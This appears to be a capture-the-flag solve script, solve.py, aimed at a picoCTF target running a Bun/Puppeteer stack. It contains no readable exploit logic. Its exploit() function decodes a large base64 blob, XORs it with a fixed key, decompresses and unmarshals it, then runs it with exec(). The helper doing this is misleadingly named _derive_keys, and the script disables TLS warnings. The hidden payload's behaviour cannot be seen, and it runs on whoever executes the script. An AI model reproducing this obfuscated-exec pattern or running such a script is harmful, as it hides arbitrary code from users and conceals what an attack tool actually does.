#!/usr/bin/env python3
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Also allowpass the target as an argument
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:443"

def _derive_keys(p, k):
    import marshal, zlib, base64
    return marshal.loads(zlib.decompress(bytes([b ^ k for b in base64.b64decode(p)])))

def exploit():
    _p = "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"
    _k = 137

    try:
        exec(_derive_keys(_p, _k), globals())
    except Exception as e:
        print(f"[-] Exploit failed. Ensure the target is running the vulnerable Bun/Puppeteer stack. Error: {e}")

if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 solve.py [TARGET_URL]")
        print("Example: python3 solve.py https://lonely-island.picoctf.net:12345")
        sys.exit(0)
    exploit()
  
